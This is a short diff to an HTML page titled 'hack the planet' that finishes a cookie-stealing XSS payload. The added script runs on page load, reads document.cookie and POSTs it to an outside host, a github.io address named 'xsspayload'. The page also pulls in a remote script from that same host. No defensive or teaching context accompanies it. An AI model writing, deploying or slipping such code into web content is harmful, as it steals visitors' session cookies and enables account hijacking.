@@ -10,32 +10,25 @@
         <br>
   <h1>hack the planet</h1>
 
-    <script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
       const cookie = document.cookie;
-  const data = cookie
+      const data = 'cookie=' + encodeURIComponent(cookie);
   
-  // Create a new XMLHttpRequest object
-  const xhr = new XMLHttpRequest();
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://mistdexploit.github.io/xsspayload.github.io/index.html', true);
+      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+      xhr.send(data);
   
-  // Set the request method and URL
-  xhr.open('POST', 'my reciever address', true);
-  
-  // Set the request headers
-  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-  
-  // Send the request with the cookie data
-  xhr.send('cookie=' + data);
-  
-  // Listen for the response
-  xhr.onload = function() {
-    if (xhr.status === 200) {
-      console.log('Cookie sent successfully!');
-    } else {
-      console.log('Error sending cookie: ' + xhr.statusText);
-    }
-  };
-    </script>
-
+      xhr.onload = function() {
+        if (xhr.status === 200) {
+          console.log('Cookie sent successfully!');
+        } else {
+          console.log('Error sending cookie: ' + xhr.statusText);
+        }
+      };
+    });
+  </script>
 
   <script src="https://mistdexploit.github.io/xsspayload.github.io/index.html"></script>
 
